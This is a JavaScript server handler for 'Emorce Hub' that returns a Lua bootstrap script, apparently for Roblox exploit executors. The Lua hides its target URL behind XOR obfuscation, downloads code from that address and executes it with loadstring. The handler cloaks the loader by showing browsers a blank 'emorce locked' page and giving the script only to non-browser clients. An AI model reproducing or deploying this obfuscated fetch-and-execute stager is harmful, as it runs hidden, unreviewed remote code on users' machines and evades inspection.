// Emorce Hub · bootstrap only (no clear gate URL)
const LUA = `--[[ EMORCE ]]
local function _k()
	local k={115,15,131,224,150,30,36,248,68,173,241,69,133,34,179,222}
	local e={27,123,247,144,229,36,11,215,52,204,130,49,224,68,202,240,18,127,243,207,209,84,78,191,14,216,191,23,170,80,210,169}
	local bxor=bit32 and bit32.bxor or function(a,b)
		local r,p=0,1
		while a>0 or b>0 do
			local aa,bb=a%2,b%2
			if aa~=bb then r=r+p end
			a,b,p=(a-aa)/2,(b-bb)/2,p*2
		end
		return r
	end
	local o={}
	for i=1,#e do o[i]=string.char(bxor(e[i],k[((i-1)%#k)+1])) end
	return table.concat(o)
end
local function _g(u)
	local b
	pcall(function()
		if type(syn)=="table" and type(syn.request)=="function" then
			b=syn.request({Url=u,Method="GET"}).Body
		elseif type(http_request)=="function" then
			b=http_request({Url=u,Method="GET"}).Body
		elseif type(request)=="function" then
			b=request({Url=u,Method="GET"}).Body
		else
			b=game:HttpGet(u)
		end
	end)
	return b
end
local u=_k()
local s=_g(u)
if type(s)~="string" or #s<80 then error("[E] gate",0) end
local f,e=(loadstring or load)(s)
if not f then error("[E] "..tostring(e),0) end
f()
`;

const HTML = "<!DOCTYPE html><html><body style=\"background:#0a0000;color:#888;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0\">emorce locked</body></html>";

module.exports = function handler(req, res) {
  const accept = String(req.headers["accept"] || "").toLowerCase();
  const dest = String(req.headers["sec-fetch-dest"] || "").toLowerCase();
  const mode = String(req.headers["sec-fetch-mode"] || "").toLowerCase();
  const wantsHtml =
    accept.includes("text/html") || dest === "document" || mode === "navigate" ||
    (req.query && (req.query.view === "1" || req.query.page === "1"));
  const forceLua =
    (req.query && (req.query.raw === "1" || req.query.lua === "1")) ||
    (accept.includes("text/plain") && !accept.includes("text/html"));
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Cache-Control", "no-store");
  if (wantsHtml && !forceLua) {
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.statusCode = 200;
    return res.end(HTML);
  }
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.statusCode = 200;
  return res.end(LUA);
};
